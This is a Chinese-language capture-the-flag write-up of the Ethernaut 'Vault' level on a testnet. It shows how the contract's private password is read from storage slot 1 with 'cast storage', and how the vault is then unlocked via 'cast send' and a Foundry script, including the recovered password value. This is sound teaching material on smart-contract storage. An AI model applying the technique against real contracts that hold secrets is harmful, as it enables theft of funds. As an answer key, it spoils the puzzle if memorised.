# Valut 读槽

## 源代码

打开vault来通过这一关,也就是让locked==false呗

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

## 目标合约分析

构造函数里locked==true

函数`unlock(bytes32)`的判定条件是如果password == \_password,locked就能==false

```solidity
    bool public locked;
    bytes32 private password;
```

这里`locked`是public变量,会自动生成**同名**的`getter`函数，可以直接通过调用该函数读取其值

而`password`是private变量,不会自动生成同名函数

* 所有状态变量都以插槽（slot）的形式保存在链上的存储中

因此可以通过访问其对应的 storage slot 来获取其值,那就读取password槽,locked(1字节)是0槽,password(32字节)是1槽

### 读取槽

```solidity
cast storage 0xd24776784db99E52631a8b4be822b895bbe39Ddd 1 --rpc-url $SEPOLIA_RPC
```

**cast stroage**是用来读取存储槽数据的指令,后边是实例地址,然后那个1就是1槽的意思

会得到0x412076657279207374726f6e67207365637265742070617373776f7264203a29,这个就是密码

## cast send调用版

```solidity
cast send <实例地址> "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc。。。。
```

注意一下调用函数的格式，函数名后边要跟着实参

## 脚本版

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract vaultsc is Script {
    Vault vault = Vault((0xd24776784db99E52631a8b4be822b895bbe39Ddd));

    function run() public {
        vm.startBroadcast();

        vault.unlock(
            0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        );

        vm.stopBroadcast();
    }
}
```


> 更新: 2025-07-11 10:58:02  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/msmugxik709fe31e>